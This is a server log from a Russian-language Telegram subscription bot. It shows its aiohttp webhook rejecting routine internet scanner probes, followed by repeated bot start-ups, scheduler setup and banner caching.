  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x05\x02'
      ^
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "UNKNOWN / HTTP/1.0" 400 209 "-" "-"
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
2026-05-24 03:10:00 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x05\x02'
      ^
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "UNKNOWN / HTTP/1.0" 400 209 "-" "-"
2026-05-24 03:10:00 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x04\x01\x01\xbb\x8e\xfb\x9dw'
      ^
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "UNKNOWN / HTTP/1.0" 400 230 "-" "-"
2026-05-24 03:29:34 | INFO     | aiohttp.access | 185.226.93.242 [24/May/2026:02:29:34 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-24 03:29:45 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-24 03:29:45 | INFO     | aiohttp.access | 184.105.247.254 [24/May/2026:02:29:45 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-24 03:49:02 | INFO     | aiohttp.access | 151.243.11.248 [24/May/2026:02:49:02 -0800] "GET / HTTP/1.1" 404 192 "-" "curl/7.68.0"
2026-05-24 03:56:03 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x03'
      ^
2026-05-24 03:56:03 | INFO     | aiohttp.access | 92.63.197.22 [24/May/2026:02:56:03 -0800] "UNKNOWN / HTTP/1.0" 400 205 "-" "-"
2026-05-24 03:56:03 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x03'
      ^
2026-05-24 03:56:03 | INFO     | aiohttp.access | 92.63.197.22 [24/May/2026:02:56:03 -0800] "UNKNOWN / HTTP/1.0" 400 205 "-" "-"
2026-05-24 04:22:28 | INFO     | aiohttp.access | 185.226.93.242 [24/May/2026:03:22:28 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-24 05:00:00 | INFO     | apscheduler.executors.default | Running job "send_subscription_reminders (trigger: cron[hour='12', minute='0'], next run at: 2026-05-25 12:00:00 UTC)" (scheduled at 2026-05-24 12:00:00+00:00)
2026-05-24 05:00:00 | INFO     | scheduler.tasks | Запуск отправки напоминаний...
2026-05-24 05:00:00 | INFO     | scheduler.tasks | Напоминания отправлены: 0
2026-05-24 05:00:00 | INFO     | apscheduler.executors.default | Job "send_subscription_reminders (trigger: cron[hour='12', minute='0'], next run at: 2026-05-25 12:00:00 UTC)" executed successfully
2026-05-24 05:12:08 | INFO     | aiohttp.access | 20.186.232.154 [24/May/2026:04:12:08 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 zgrab/0.x"
2026-05-24 05:12:13 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'MGLNDD_195.10.205.15_8080\n'
       ^
2026-05-24 05:12:13 | INFO     | aiohttp.access | 20.186.232.154 [24/May/2026:04:12:13 -0800] "UNKNOWN / HTTP/1.0" 400 229 "-" "-"
2026-05-24 05:26:40 | INFO     | aiohttp.access | 112.46.213.189 [24/May/2026:04:26:40 -0800] "GET / HTTP/1.1" 404 173 "-" "-"
2026-05-24 06:10:08 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'MGLNDD_195.10.205.15_8080\n'
       ^
2026-05-24 06:10:08 | INFO     | aiohttp.access | 20.169.107.214 [24/May/2026:05:10:08 -0800] "UNKNOWN / HTTP/1.0" 400 229 "-" "-"
2026-05-24 06:38:40 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-24 16:53:40 | INFO     | __main__ | Запуск бота...
2026-05-24 16:53:40 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-24 16:53:40 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-24 16:53:40 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-24 16:53:40 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-24 16:53:40 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-24 16:53:40 | INFO     | database.db | База данных инициализирована
2026-05-24 16:53:40 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-24 16:53:40 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-24 16:53:40 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-24 16:53:40 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-24 16:53:42 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-24 16:53:42 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-24 16:53:43 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-24 16:53:43 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-24 16:53:44 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-24 16:53:44 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-24 16:53:44 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-24 16:53:44 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-24 16:53:51 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-24 17:01:41 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-24 17:01:41 | WARNING  | aiogram.dispatcher | Sleep for 1.000000 seconds and try again... (tryings = 0, bot id = 8780899509)
2026-05-24 17:01:46 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-24 17:01:46 | WARNING  | aiogram.dispatcher | Sleep for 1.498787 seconds and try again... (tryings = 1, bot id = 8780899509)
2026-05-25 20:04:20 | INFO     | __main__ | Запуск бота...
2026-05-25 20:04:20 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:04:20 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:04:20 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:04:20 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:04:20 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:04:20 | INFO     | database.db | База данных инициализирована
2026-05-25 20:04:20 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:04:20 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:04:20 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:04:20 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:04:22 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:04:22 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:04:23 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:04:23 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:04:25 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:04:25 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:04:25 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:04:25 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-25 20:09:32 | INFO     | __main__ | Запуск бота...
2026-05-25 20:09:32 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:09:32 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:09:32 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:09:32 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:09:32 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:09:32 | INFO     | database.db | База данных инициализирована
2026-05-25 20:09:32 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:09:32 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:09:32 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:09:32 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:09:33 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:09:33 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:09:34 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:09:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:09:35 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:09:35 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:09:35 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:09:35 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-25 20:09:47 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:13:15 | INFO     | __main__ | Запуск бота...
2026-05-25 20:13:15 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:13:15 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:13:15 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:13:15 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:13:15 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:13:15 | INFO     | database.db | База данных инициализирована
2026-05-25 20:13:15 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:13:15 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:13:15 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:13:15 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:13:16 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:13:16 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:13:17 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:13:17 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:13:17 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:13:17 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:13:17 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:13:17 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-25 20:13:43 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:14:53 | INFO     | __main__ | Запуск бота...
2026-05-25 20:14:53 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:14:53 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:14:53 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:14:53 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:14:53 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:14:54 | INFO     | database.db | База данных инициализирована
2026-05-25 20:14:54 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:14:54 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:14:54 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:14:54 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:14:55 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:14:55 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:14:55 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:14:55 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:14:56 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:14:56 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:14:56 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:14:56 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-25 20:15:12 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:16:19 | INFO     | __main__ | Запуск бота...
2026-05-25 20:16:19 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:16:19 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:16:19 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:16:19 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:16:19 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:16:19 | INFO     | database.db | База данных инициализирована
2026-05-25 20:16:19 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:16:19 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:16:19 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:16:19 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:16:20 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:16:20 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:16:21 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:16:21 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:16:22 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:16:22 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:16:22 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:16:22 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-25 20:16:25 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:16:43 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:17:12 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:20:31 | INFO     | __main__ | Запуск бота...
2026-05-25 20:20:31 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:20:31 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:20:31 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:20:31 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:20:31 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:20:31 | INFO     | database.db | База данных инициализирована
2026-05-25 20:20:31 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:20:31 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:20:31 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:20:31 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:20:32 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:20:32 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:20:33 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:20:33 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:20:34 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:20:34 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:20:34 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:20:34 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-25 20:20:34 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:20:34 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:20:42 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:22:55 | INFO     | __main__ | Запуск бота...
2026-05-25 20:22:55 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:22:55 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:22:55 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:22:55 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:22:55 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:22:55 | INFO     | database.db | База данных инициализирована
2026-05-25 20:22:55 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:22:55 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:22:55 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:22:55 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:22:56 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:22:56 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:22:56 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:22:56 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:22:57 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:22:57 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:22:57 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:22:57 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-25 20:26:07 | INFO     | __main__ | Запуск бота...
2026-05-25 20:26:07 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:26:07 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:26:07 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:26:07 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:26:07 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:26:07 | INFO     | database.db | База данных инициализирована
2026-05-25 20:26:07 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:26:07 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:26:07 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:26:07 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:26:08 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:26:08 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:26:09 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:26:09 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:26:10 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:26:10 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:26:10 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:26:10 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-25 20:26:19 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-25 20:30:44 | INFO     | __main__ | Запуск бота...
2026-05-25 20:30:44 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:30:44 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:30:44 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:30:44 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:30:44 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:30:44 | INFO     | database.db | База данных инициализирована
2026-05-25 20:30:44 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:30:44 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:30:44 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:30:44 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:30:45 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:30:45 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:30:46 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:30:46 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:30:47 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:30:47 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:30:47 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:30:47 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-25 20:34:40 | INFO     | __main__ | Запуск бота...
2026-05-25 20:34:40 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:34:40 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-25 20:34:40 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-25 20:34:40 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-25 20:34:40 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-25 20:34:40 | INFO     | database.db | База данных инициализирована
2026-05-25 20:34:40 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-25 20:34:40 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-25 20:34:40 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-25 20:34:40 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-25 20:34:41 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:34:41 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-25 20:34:42 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAICBWoR...
2026-05-25 20:34:42 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-25 20:34:42 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAICBGoR...
2026-05-25 20:34:42 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-25 20:34:43 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-25 20:34:43 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
